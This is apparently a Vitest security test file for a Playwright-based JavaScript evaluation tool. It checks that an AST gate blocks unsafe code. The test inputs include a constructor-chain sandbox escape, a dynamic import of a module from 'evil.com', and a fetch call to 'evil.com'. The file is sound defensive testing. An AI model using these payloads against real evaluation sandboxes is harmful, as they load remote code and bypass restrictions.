import { beforeEach, describe, expect, it, vi } from "vitest";

// ---------------------------------------------------------------------------
// Mock Playwright dependencies (same pattern as evaluate.abort test)
// ---------------------------------------------------------------------------

let page: { evaluate: ReturnType<typeof vi.fn> } | null = null;
let locator: { evaluate: ReturnType<typeof vi.fn> } | null = null;

const forceDisconnectPlaywrightForTarget = vi.fn(async () => {});
const getPageForTargetId = vi.fn(async () => {
  if (!page) {
    throw new Error("test: page not set");
  }
  return page;
});
const ensurePageState = vi.fn(() => {});
const restoreRoleRefsForTarget = vi.fn(() => {});
const refLocator = vi.fn(() => {
  if (!locator) {
    throw new Error("test: locator not set");
  }
  return locator;
});

vi.mock("./pw-session.js", () => {
  return {
    ensurePageState,
    forceDisconnectPlaywrightForTarget,
    getPageForTargetId,
    refLocator,
    restoreRoleRefsForTarget,
  };
});

let evaluateViaPlaywright: typeof import("./pw-tools-core.interactions.js").evaluateViaPlaywright;
let waitForViaPlaywright: typeof import("./pw-tools-core.interactions.js").waitForViaPlaywright;

describe("evaluateViaPlaywright — security (AST gate)", () => {
  beforeEach(async () => {
    vi.resetModules();
    vi.clearAllMocks();
    page = null;
    locator = null;
    ({ evaluateViaPlaywright, waitForViaPlaywright } =
      await import("./pw-tools-core.interactions.js"));
  });

  // -----------------------------------------------------------------------
  // AST Layer (Layer 2) — rejects BEFORE Playwright is called
  // -----------------------------------------------------------------------

  it("rejects .constructor chain before calling Playwright", async () => {
    page = { evaluate: vi.fn(async () => "should-not-reach") };

    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: '() => ({}).constructor.constructor("return 1")()',
      }),
    ).rejects.toThrow("constructor");

    // Playwright should NOT have been called
    expect(page.evaluate).not.toHaveBeenCalled();
  });

  it("rejects import() before calling Playwright", async () => {
    page = { evaluate: vi.fn(async () => "should-not-reach") };

    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: '() => import("https://evil.com/module.js")',
      }),
    ).rejects.toThrow("import");

    expect(page.evaluate).not.toHaveBeenCalled();
  });

  it("rejects code exceeding length limit before calling Playwright", async () => {
    page = { evaluate: vi.fn(async () => "should-not-reach") };

    const longCode = "() => " + '"a"'.repeat(15_000);
    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: longCode,
      }),
    ).rejects.toThrow("max length");

    expect(page.evaluate).not.toHaveBeenCalled();
  });

  it("rejects blocked identifier (fetch) via AST", async () => {
    page = { evaluate: vi.fn(async () => "should-not-reach") };

    await expect(
      evaluateViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: '() => fetch("https://evil.com")',
      }),
    ).rejects.toThrow(/fetch|unsafe/i);

    expect(page.evaluate).not.toHaveBeenCalled();
  });

  // -----------------------------------------------------------------------
  // Safe code should still work
  // -----------------------------------------------------------------------

  it("allows safe code and calls Playwright evaluate", async () => {
    page = { evaluate: vi.fn(async () => "My Page Title") };

    const result = await evaluateViaPlaywright({
      cdpUrl: "http://127.0.0.1:9222",
      fn: "() => document.title",
    });

    expect(result).toBe("My Page Title");
    expect(page.evaluate).toHaveBeenCalled();
  });

  it("allows safe code with element ref and calls locator.evaluate", async () => {
    page = { evaluate: vi.fn() };
    locator = { evaluate: vi.fn(async () => "Hello World") };

    const result = await evaluateViaPlaywright({
      cdpUrl: "http://127.0.0.1:9222",
      fn: "(el) => el.textContent",
      ref: "e1",
    });

    expect(result).toBe("Hello World");
    expect(locator.evaluate).toHaveBeenCalled();
    expect(page.evaluate).not.toHaveBeenCalled();
  });
});

describe("waitForViaPlaywright — security (AST gate)", () => {
  beforeEach(async () => {
    vi.resetModules();
    vi.clearAllMocks();
    page = null;
    locator = null;
    ({ evaluateViaPlaywright, waitForViaPlaywright } =
      await import("./pw-tools-core.interactions.js"));
  });

  it("rejects blocked fn pattern before calling page.waitForFunction", async () => {
    const waitForFunction = vi.fn(async () => {});
    page = {
      evaluate: vi.fn(),
      // waitForViaPlaywright uses getPageForTargetId which returns this page mock
      // but it uses page.waitForFunction, not page.evaluate
    } as any;
    // We need to add waitForFunction to the page mock
    (page as any).waitForFunction = waitForFunction;
    (page as any).getByText = vi.fn(() => ({ first: () => ({ waitFor: vi.fn() }) }));
    (page as any).locator = vi.fn(() => ({ first: () => ({ waitFor: vi.fn() }) }));
    (page as any).waitForURL = vi.fn();
    (page as any).waitForLoadState = vi.fn();
    (page as any).waitForTimeout = vi.fn();

    await expect(
      waitForViaPlaywright({
        cdpUrl: "http://127.0.0.1:9222",
        fn: '() => ({}).constructor.constructor("return 1")()',
      }),
    ).rejects.toThrow("constructor");

    expect(waitForFunction).not.toHaveBeenCalled();
  });

  it("allows safe fn and calls page.waitForFunction", async () => {
    const waitForFunction = vi.fn(async () => true);
    page = {
      evaluate: vi.fn(),
    } as any;
    (page as any).waitForFunction = waitForFunction;
    (page as any).getByText = vi.fn(() => ({ first: () => ({ waitFor: vi.fn() }) }));
    (page as any).locator = vi.fn(() => ({ first: () => ({ waitFor: vi.fn() }) }));
    (page as any).waitForURL = vi.fn();
    (page as any).waitForLoadState = vi.fn();
    (page as any).waitForTimeout = vi.fn();

    await waitForViaPlaywright({
      cdpUrl: "http://127.0.0.1:9222",
      fn: "() => document.title !== ''",
    });

    expect(waitForFunction).toHaveBeenCalled();
  });
});
